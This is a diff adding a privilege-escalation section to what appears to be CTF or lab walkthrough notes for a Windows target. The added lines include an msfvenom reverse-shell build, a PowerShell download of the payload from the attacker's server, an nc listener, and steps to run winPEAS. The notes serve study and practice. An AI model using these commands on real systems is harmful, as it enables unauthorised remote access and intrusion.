@@ -118,3 +118,20 @@ __VIEWSTATE=mxGh%2BdQ%2F%2BpArh2IP5hEYlvCLap4USWw8NMWpW%2FCdFy6ebKKcxpebQBn520XB
 
 ## Privilege Escalation without Metasploit
 
+- Use msfvenom to generate a non-meterpreter reverse shell (can reuse shell from earlier)
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=<attack machine ip> LPORT=<attack machine port> -f exe > shell.exe`
+- Navigate to `C:\Windows\Temp` or other writable directory
+- Pull shell to target machine
+    - Start temporary python server on attack machine
+        - `python3 -m http.server <port>`
+        - Note: everything within the folder will be visible wherever the server is started
+    - Download file from server
+        - `powershell.exe -Command "iwr -Uri http://<attack machine ip>:<python server port>/shell.exe -OutFile shell.exe"`
+- `nc -lvnp <port>` to start listening on attack machine
+- `.\shell.exe` on target machine to reach back with (more) stable shell to attack machine
+- Repeat steps to download winPEAS onto target machine
+- Run winPEAS with `.\winPEAS.ps1`, `.\winPEAS.exe`, or `winPEAS.bat`
+
+> The original install time is **8/3/2019, 10:43:23 AM**
+
+- This can also be found using `systeminfo`
